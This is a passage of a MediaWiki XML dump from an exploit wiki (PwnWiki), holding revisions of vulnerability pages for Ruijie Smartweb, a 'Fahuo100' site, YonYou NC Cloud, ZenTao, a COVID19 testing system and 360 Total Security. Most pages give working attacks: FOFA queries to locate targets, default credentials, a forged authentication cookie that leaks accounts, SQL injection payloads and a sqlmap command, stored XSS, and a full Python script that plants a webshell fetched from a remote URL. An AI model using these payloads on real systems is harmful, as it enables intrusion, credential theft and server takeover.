&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞利用==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Cookice添加以下內容
&lt;/div&gt;
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
可以獲取所有賬戶信息
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>7obebxy4gvxvmu4mp7xfsj0y32q5syf</sha1>
    </revision>
    <revision>
      <id>7033</id>
      <parentid>7032</parentid>
      <timestamp>2021-07-12T07:04:41Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "==漏洞利用=="</comment>
      <origin>7033</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="641" sha1="34htslweflofvbr4o9wbdt2updybklm" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;

==默认guest密码==

&lt;pre&gt;
guest/guest
&lt;/pre&gt;


==漏洞位置==

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


==漏洞利用==

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Cookice添加以下內容
&lt;/div&gt;
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
可以獲取所有賬戶信息
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>34htslweflofvbr4o9wbdt2updybklm</sha1>
    </revision>
    <revision>
      <id>7037</id>
      <parentid>7033</parentid>
      <timestamp>2021-07-12T07:05:06Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "可以获取所有账户信息"</comment>
      <origin>7037</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="457" sha1="kr1zrcf4id6ply8u7wtp2yi5n7oh0da" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;

==默认guest密码==

&lt;pre&gt;
guest/guest
&lt;/pre&gt;


==漏洞位置==

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


==漏洞利用==

Cookie添加以下内容
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


可以获取所有账户信息


==参考==
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>kr1zrcf4id6ply8u7wtp2yi5n7oh0da</sha1>
    </revision>
    <revision>
      <id>7104</id>
      <parentid>7037</parentid>
      <timestamp>2021-07-13T04:05:31Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>Updating to match new version of source page</comment>
      <origin>7104</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="492" sha1="jgonb9wbc1qi90txkqmiw30j4lm1hpb" xml:space="preserve">&lt;languages  /&gt;
==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;
==默认guest密码==
&lt;pre&gt;
guest/guest
&lt;/pre&gt;


==漏洞位置==
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


==漏洞利用==
&lt;div class="mw-translate-fuzzy"&gt;
Cookie添加以下内容
&lt;/div&gt;
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


可以获取所有账户信息


==参考==
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>jgonb9wbc1qi90txkqmiw30j4lm1hpb</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-17369 銳捷Smartweb管理系統 密碼信息洩露漏洞/zh-tw</title>
    <ns>0</ns>
    <id>6082</id>
    <revision>
      <id>6952</id>
      <timestamp>2021-07-10T07:55:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==默認guest密碼=="</comment>
      <origin>6952</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="458" sha1="2w79trgvofsgf8rwq16bl5wk7k9znz1" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;

==默認guest密碼==

&lt;pre&gt;
guest/guest
&lt;/pre&gt;


==漏洞位置==

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


==漏洞利用==

Cookice添加以下內容
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


可以獲取所有賬戶信息


==參考==
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>2w79trgvofsgf8rwq16bl5wk7k9znz1</sha1>
    </revision>
    <revision>
      <id>7103</id>
      <parentid>6952</parentid>
      <timestamp>2021-07-13T04:05:25Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>Updating to match new version of source page</comment>
      <origin>7103</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="493" sha1="l75a7raeu35du3bafqe47qrwh1n511q" xml:space="preserve">&lt;languages  /&gt;
==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;
==默認guest密碼==
&lt;pre&gt;
guest/guest
&lt;/pre&gt;


==漏洞位置==
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


==漏洞利用==
&lt;div class="mw-translate-fuzzy"&gt;
Cookice添加以下內容
&lt;/div&gt;
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


可以獲取所有賬戶信息


==參考==
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>l75a7raeu35du3bafqe47qrwh1n511q</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-30193 發貨100 M id SQL注入漏洞</title>
    <ns>0</ns>
    <id>3339</id>
    <revision>
      <id>3897</id>
      <timestamp>2021-06-03T02:42:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; icon_hash="1420424513" &lt;/pre&gt;  ==POC== &lt;pre&gt; /?M_id=1%27&amp;type=product &lt;/pre&gt;  ==SQLMAP== &lt;pre&gt; sqlmap -u 'http://xxx.xxx.xxx.xxx/?M_id=11%27&amp;type=product' -p M_..."</comment>
      <origin>3897</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="184" sha1="3qf7un9z8kh8gmdsv6tgqftiqaeo1bk" xml:space="preserve">==FOFA==
&lt;pre&gt;
icon_hash="1420424513"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/?M_id=1%27&amp;type=product
&lt;/pre&gt;

==SQLMAP==
&lt;pre&gt;
sqlmap -u 'http://xxx.xxx.xxx.xxx/?M_id=11%27&amp;type=product' -p M_id
&lt;/pre&gt;</text>
      <sha1>3qf7un9z8kh8gmdsv6tgqftiqaeo1bk</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-34249 用友NC Cloud SQL注入漏洞</title>
    <ns>0</ns>
    <id>4087</id>
    <revision>
      <id>4704</id>
      <timestamp>2021-06-10T04:03:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt;  &lt;translate&gt; ==影響版本== &lt;/translate&gt; NC Cloud  ==FOFA== &lt;pre&gt; "NCCloud" &lt;/pre&gt;  ==POC== &lt;pre&gt; /fs/console?username=admin&amp;password=123456 &lt;/pre&gt;"</comment>
      <origin>4704</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="163" sha1="6zntwz6igr35haorwt777simpjgskq0" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>6zntwz6igr35haorwt777simpjgskq0</sha1>
    </revision>
    <revision>
      <id>4706</id>
      <parentid>4704</parentid>
      <timestamp>2021-06-10T04:04:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4706</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="174" sha1="1wxg8qxk3vmygqvctranoy7zaz4hlc7" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>1wxg8qxk3vmygqvctranoy7zaz4hlc7</sha1>
    </revision>
    <revision>
      <id>4719</id>
      <parentid>4706</parentid>
      <timestamp>2021-06-10T07:58:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>4719</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="239" sha1="bjvlwv50gvnwb3pfcxbeirverhadop8" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

==Payload==
&lt;translate&gt;
⚠️️username處可以注入。
&lt;/translate&gt;
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>bjvlwv50gvnwb3pfcxbeirverhadop8</sha1>
    </revision>
    <revision>
      <id>4720</id>
      <parentid>4719</parentid>
      <timestamp>2021-06-10T07:58:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4720</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="250" sha1="dfyv6hyghf3k60inliw57u7ggder2kw" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

==Payload==
&lt;translate&gt;
&lt;!--T:2--&gt;
⚠️️username處可以注入。
&lt;/translate&gt;
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>dfyv6hyghf3k60inliw57u7ggder2kw</sha1>
    </revision>
    <revision>
      <id>4722</id>
      <parentid>4720</parentid>
      <timestamp>2021-06-10T07:59:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>4722</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="280" sha1="fwuu2i5hu0rub2yqnlndj02pevjiekl" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

&lt;translate&gt;
==漏洞位置==
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
⚠️️username處可以注入。
&lt;/translate&gt;
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>fwuu2i5hu0rub2yqnlndj02pevjiekl</sha1>
    </revision>
    <revision>
      <id>4723</id>
      <parentid>4722</parentid>
      <timestamp>2021-06-10T08:00:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4723</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="291" sha1="blrldent9m7i6evdqt7ka39nuaih4ij" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

&lt;translate&gt;
==漏洞位置== &lt;!--T:3--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
⚠️️username處可以注入。
&lt;/translate&gt;
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>blrldent9m7i6evdqt7ka39nuaih4ij</sha1>
    </revision>
    <revision>
      <id>4726</id>
      <parentid>4723</parentid>
      <timestamp>2021-06-10T08:06:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>4726</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="387" sha1="q2j77htr428vxt1i3ka8q8fa70wnlyw" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

&lt;translate&gt;
==漏洞位置== &lt;!--T:3--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
⚠️️username處可以注入。
&lt;/translate&gt;
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;


==Payload==
&lt;pre&gt;
/fs/console?username=admin';WAITFOR DELAY '0:0:5' --&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>q2j77htr428vxt1i3ka8q8fa70wnlyw</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-34249 用友NC Cloud SQL注入漏洞/en</title>
    <ns>0</ns>
    <id>4870</id>
    <revision>
      <id>5609</id>
      <timestamp>2021-06-24T01:43:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CNVD-2021-34249 YonYou NC Cloud SQL injection vulnerability"</comment>
      <origin>5609</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="293" sha1="g8bd3ynw68yprxqzc1jjnmhi7lemfm8" xml:space="preserve">&lt;languages /&gt;

==Affected Versions==
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

==Vulnerability location==
⚠️️Username can be injected.
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;


==Payload==
&lt;pre&gt;
/fs/console?username=admin';WAITFOR DELAY '0:0:5' --&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>g8bd3ynw68yprxqzc1jjnmhi7lemfm8</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-34249 用友NC Cloud SQL注入漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4099</id>
    <revision>
      <id>4717</id>
      <timestamp>2021-06-10T05:08:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CNVD-2021-34249 用友NC Cloud SQL注入漏洞"</comment>
      <origin>4717</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="138" sha1="jc08jkhskfbm48exf8tiagc45a8yihq" xml:space="preserve">&lt;languages /&gt;

==影响版本==
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>jc08jkhskfbm48exf8tiagc45a8yihq</sha1>
    </revision>
    <revision>
      <id>4725</id>
      <parentid>4717</parentid>
      <timestamp>2021-06-10T08:01:27Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>Updating to match new version of source page</comment>
      <origin>4725</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="305" sha1="5yqhhngyfbu00k1r13kuq7mml05q5by" xml:space="preserve">&lt;languages /&gt;

==影响版本==
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞位置==
&lt;/div&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
⚠️️username處可以注入。
&lt;/div&gt;
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>5yqhhngyfbu00k1r13kuq7mml05q5by</sha1>
    </revision>
    <revision>
      <id>4727</id>
      <parentid>4725</parentid>
      <timestamp>2021-06-10T08:07:30Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>Updating to match new version of source page</comment>
      <origin>4727</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="401" sha1="0zcpj7f7wggaesurc489sbybsqrnafk" xml:space="preserve">&lt;languages /&gt;

==影响版本==
NC Cloud

==FOFA==
&lt;pre&gt;
"NCCloud"
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞位置==
&lt;/div&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
⚠️️username處可以注入。
&lt;/div&gt;
&lt;pre&gt;
/fs/console?username=admin&amp;password=123456
&lt;/pre&gt;


==Payload==
&lt;pre&gt;
/fs/console?username=admin';WAITFOR DELAY '0:0:5' --&amp;password=123456
&lt;/pre&gt;</text>
      <sha1>0zcpj7f7wggaesurc489sbybsqrnafk</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-C-2020-121325 禪道 小於12.4.2 文件上傳漏洞</title>
    <ns>0</ns>
    <id>1253</id>
    <revision>
      <id>1568</id>
      <timestamp>2021-04-13T02:00:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from   : http://wiki.peiqi.tech  import base64 import requests import random import re import json im..."</comment>
      <origin>1568</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3429" sha1="j1shqgy2483kx651lvfkrja74p81tr4" xml:space="preserve">==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')
    print('+  \033[34mVersion: zentao version &lt;= 12.4.2                                 \033[0m')
    print('+  \033[36m使用格式: python3 CNVD-C-2020-121325.py                             \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mShell       &gt;&gt;&gt; http://xxx.xxx.xxx.xxx/shell.php(恶意文件地址)       \033[0m')
    print('+  \033[36mZentaosid   &gt;&gt;&gt; xxxxxxxxxxxxxx(cookie字段)                          \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    version_url = target_url + "/www/index.php?mode=getconfig"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        response = requests.get(url=version_url, timeout=20, headers=headers)
        version = json.loads(response.text)['version']
        print("\033[32m[o] 禅道版本为:{}\033[0m".format(version))

    except Exception as e:
        print("\033[31m[x] 获取版本失败 \033[0m", e)


def POC_2(target_url, shell_url, zentaosid):
    options = shell_url.split("://")
    if options[0] == "http":
        shell_url = "HTTP://" + options[1]
    elif options[0] == "ftp":
        shell_url = "ftp://" + options[1]
    else:
        print("\033[31m[x] 请使用正确的请求地址 \033[0m")
        sys.exit(0)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":"zentaosid={}".format(zentaosid)
    }

    shell_url_base = str((base64.b64encode(shell_url.encode('utf-8'))),'utf-8')
    vuln_url = target_url + "/www/index.php?m=client&amp;f=download&amp;version=test&amp;link={}".format(shell_url_base)
    print("\033[32m[o] 请求漏洞url：{}\033[0m".format(vuln_url))

    try:
        response = requests.get(url=vuln_url, timeout=20, headers=headers)
        if "保存成功" in response.text:
            print("\033[32m[o] 成功写入Webshell，URL地址为：{}/www/data/client/test/Webshell_name.php\033[0m".format(target_url))
        else:
            print("\033[31m[x] 恶意文件下载失败 \033[0m")
    except:
        print("\033[31m[x] 恶意文件下载失败 \033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   &gt;&gt;&gt; \033[0m"))
    shell_url  = str(input("\033[35mShell &gt;&gt;&gt; \033[0m"))
    zentaosid  = str(input("\033[35mZentaosid &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
    POC_2(target_url, shell_url, zentaosid)
&lt;/pre&gt;



==參考==
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-C-2020-121325.html</text>
      <sha1>j1shqgy2483kx651lvfkrja74p81tr4</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-C-2021-132630 360安全衛士隔離沙箱邏輯缺陷漏洞</title>
    <ns>0</ns>
    <id>4479</id>
    <revision>
      <id>5155</id>
      <timestamp>2021-06-16T02:17:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; 主要針對對文件防範能力較強的用戶，該漏洞可造成物理機被感染，突破虛擬環境，..."</comment>
      <origin>5155</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="430" sha1="4q42sbkg0q2knxgoxwzanknda3x0ayb" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
主要針對對文件防範能力較強的用戶，該漏洞可造成物理機被感染，突破虛擬環境，破壞物理機，對物理機進行實際性的破壞。
&lt;/pre&gt;

&lt;translate&gt;
==演示視頻==
&lt;/translate&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=Aovvl0bJPk8&lt;/youtube&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://mp.weixin.qq.com/s/euVo-FbW8dSITxVrL5tf4A</text>
      <sha1>4q42sbkg0q2knxgoxwzanknda3x0ayb</sha1>
    </revision>
    <revision>
      <id>5156</id>
      <parentid>5155</parentid>
      <timestamp>2021-06-16T02:17:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>5156</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="442" sha1="h4csuqhneqo835tpwew0nw7ysccn8m8" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;translate&gt;
主要針對對文件防範能力較強的用戶，該漏洞可造成物理機被感染，突破虛擬環境，破壞物理機，對物理機進行實際性的破壞。
&lt;/translate&gt;

&lt;translate&gt;
==演示視頻==
&lt;/translate&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=Aovvl0bJPk8&lt;/youtube&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://mp.weixin.qq.com/s/euVo-FbW8dSITxVrL5tf4A</text>
      <sha1>h4csuqhneqo835tpwew0nw7ysccn8m8</sha1>
    </revision>
    <revision>
      <id>5158</id>
      <parentid>5156</parentid>
      <timestamp>2021-06-16T02:18:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5158</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="486" sha1="pdxp34as2r1o55vdo6y5xxjlittbgd9" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
主要針對對文件防範能力較強的用戶，該漏洞可造成物理機被感染，突破虛擬環境，破壞物理機，對物理機進行實際性的破壞。
&lt;/translate&gt;

&lt;translate&gt;
==演示視頻== &lt;!--T:3--&gt;
&lt;/translate&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=Aovvl0bJPk8&lt;/youtube&gt;

&lt;translate&gt;
==參考== &lt;!--T:4--&gt;
&lt;/translate&gt;
https://mp.weixin.qq.com/s/euVo-FbW8dSITxVrL5tf4A</text>
      <sha1>pdxp34as2r1o55vdo6y5xxjlittbgd9</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-C-2021-132630 360安全衛士隔離沙箱邏輯缺陷漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4490</id>
    <revision>
      <id>5168</id>
      <timestamp>2021-06-16T02:19:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "主要针对对文件防范能力较强的用户，该漏洞可造成物理机被感染，突破虚拟环境，破坏物理机，对物理机进行实际性的破坏。"</comment>
      <origin>5168</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="342" sha1="fjfokn8q2tf1yzp4siecn88vggvnab6" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==
主要针对对文件防范能力较强的用户，该漏洞可造成物理机被感染，突破虚拟环境，破坏物理机，对物理机进行实际性的破坏。

==演示视频==
&lt;youtube&gt;https://www.youtube.com/watch?v=Aovvl0bJPk8&lt;/youtube&gt;

==参考==
https://mp.weixin.qq.com/s/euVo-FbW8dSITxVrL5tf4A</text>
      <sha1>fjfokn8q2tf1yzp4siecn88vggvnab6</sha1>
    </revision>
  </page>
  <page>
    <title>COVID19 Testing Management System 1.0 - 'State' XSS漏洞</title>
    <ns>0</ns>
    <id>4383</id>
    <revision>
      <id>5049</id>
      <timestamp>2021-06-15T01:20:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: COVID19 Testing Management System 1.0 - 'State' Stored Cross-Site-Scripting (XSS) # Date: 11/06/2021 # Exploit Author: BHAVESH KAUL # Vendor Homepage: h..."</comment>
      <origin>5049</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1134" sha1="5jf4wrivalyldc679lxlk595d5kdo6j" xml:space="preserve">&lt;pre&gt;
# Exploit Title: COVID19 Testing Management System 1.0 - 'State' Stored Cross-Site-Scripting (XSS)
# Date: 11/06/2021
# Exploit Author: BHAVESH KAUL
# Vendor Homepage: https://phpgurukul.com
# Software Link: https://phpgurukul.com/covid19-testing-management-system-using-php-and-mysql/
# Version: 1.0
# Tested on: Server: XAMPP

# Description #

COVID19 Testing Management System 1.0 is vulnerable to stored cross site scripting because of insufficient user supplied data sanitization. Anyone can submit a stored XSS payload without login when registering as a new user. This makes the application store our payload in the database and it is fired everything the dashboard is viewed.

# Proof of Concept (PoC) : Exploit #

1) Goto: http://localhost/covid-tms/new-user-testing.php
2) Enter the following payload in 'State' parameter: &lt;script&gt;alert(1)&lt;/script&gt;
3) Fill out other information and submit query
4) Now goto: http://localhost/covid-tms/live-test-updates.php
5) Stored XSS payload is fired

# Image PoC : Reference Image #

1) Vulnerable Parameter: https://ibb.co/1vyNM2w
2) Payload Fired: https://ibb.co/CsfPnXK
&lt;/pre&gt;</text>
      <sha1>5jf4wrivalyldc679lxlk595d5kdo6j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-1999-0532 DNS服務器區域傳輸漏洞</title>
    <ns>0</ns>
    <id>572</id>
    <revision>
      <id>786</id>
      <timestamp>2021-03-31T06:23:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
